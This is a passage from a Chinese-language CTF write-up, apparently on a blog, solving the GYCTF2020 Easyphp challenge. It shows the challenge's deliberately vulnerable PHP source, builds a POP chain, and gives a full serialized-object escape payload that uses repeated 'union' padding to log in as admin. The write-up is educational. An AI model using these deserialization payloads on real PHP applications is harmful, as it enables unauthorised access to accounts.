class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你的ID是"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你好！"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这个功能还没有写完 先占坑</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//危</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败，错误:"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'用户不存在!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'密码错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//还没来得及写</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要想获得flag，有两种办法：</p><p>1.token=admin</p><p>2.输入匹配的用户名密码</p><p>POP链如下：</p><pre class="line-numbers language-none"><code class="language-none">UpdateHelper::__destruct() -&gt; User::__toString() -&gt; Info::__call() -&gt; dbCtrl::login()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成</p><pre class="line-numbers language-none"><code class="language-none">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个反序列化只能通过实例化类的时候传值，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234737377.png"></p><p>但它的实参是不可控的，所以这个反序列化没法用。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234931741.png"></p><p>还好这<code>User</code>还有个反序列化，而且是可控的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804235144278.png"></p><p>按程序的逻辑，传入的只是字符串，没法利用，所以需要进行字符串逃逸，把字符串”升格“为对象。</p><p>可以利用这个进行字符串逃逸</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210805232159045.png"></p><p>Info类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'10'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造个payload：</p><p>1.前方增加<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，相当于<code>CtrlCase</code>是一个<code>UpdateHelper</code>对象，然后在这个对象被销毁的时候，就会触发pop链，由于销毁是自动的，所以根本不需要考虑在哪调用<code>CtrlCase</code>！！！！！！</p><p>2.最后加一个<code>&#125;</code>，用于闭合</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'";s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成：</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;10&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后利用反序列化字符串逃逸，union-&gt;hacker，增加一个字符，意味着可逃一个字符。</p><p>上方的payload长度是263，意味着要逃263个字符，那就是263个union。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/20200329134813769.png" alt="20200329134813769"></p><p>放个payload</p><pre class="line-numbers language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Q：已经设置好<code>$_SESSION[&#39;token&#39;]</code>为admin了，为什么登录的时候用户名必须为admin？测试了下输入随便输入其他账号密码，不会提示用户不存在/密码错误，就很奇怪。</p><p>A：想了一会，有答案了，因为不知道其他正常的用户名，<code>select id,password from user where username=?</code>没有正常返回值，但又因为token为admin，导致直接return，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011234334.png"></p><p>然后id是空的，在这就啥都没发生了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011308616.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯2018]Unfinish</title>
      <link href="/p/3379740036.html"/>
      <url>/p/3379740036.html</url>
      
